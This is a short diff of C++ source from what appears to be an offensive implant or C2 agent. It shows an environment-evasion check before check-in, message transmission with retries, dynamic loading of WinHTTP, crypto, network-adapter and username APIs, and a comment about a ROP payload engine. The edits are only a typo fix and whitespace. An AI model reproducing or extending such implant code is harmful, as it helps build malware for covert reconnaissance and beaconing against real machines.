@@ -1,5 +1,5 @@
 #include <core/corelib.hpp>
-// todo: the idea for "ROP-Engine" is just to make writing rop payloads/programming easier. (Deisl)
+// todo: the idea for "ROP-Engine" is just to make writing rop payloads/programming easier. (Desil)
 
 VOID Entrypoint(HMODULE Base) {
 
@@ -32,12 +32,14 @@ namespace Implant {
 
             if (!Ctx->Session.Checkin && !Ctx->Transport.OutboundQueue) {
                 Opsec::SeCheckEnvironment();
+
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
                 }
             }
 
             Message::MessageTransmit();
+
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
 
@@ -94,7 +96,7 @@ namespace Implant {
             !(FPTR(Ctx->win32.WinHttpQueryHeaders,          Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
             !(FPTR(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
             !(FPTR(Ctx->win32.WinHttpCloseHandle,           Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
-            !(FPTR(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphl, GETADAPTERSINFO)) ||
+            !(FPTR(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphl   , GETADAPTERSINFO)) ||
             !(FPTR(Ctx->win32.CryptStringToBinaryA,         Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
             !(FPTR(Ctx->win32.CryptBinaryToStringA,         Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
             !(FPTR(Ctx->win32.GetUserNameA,                 Ctx->Modules.advapi, GETUSERNAMEA)) ||
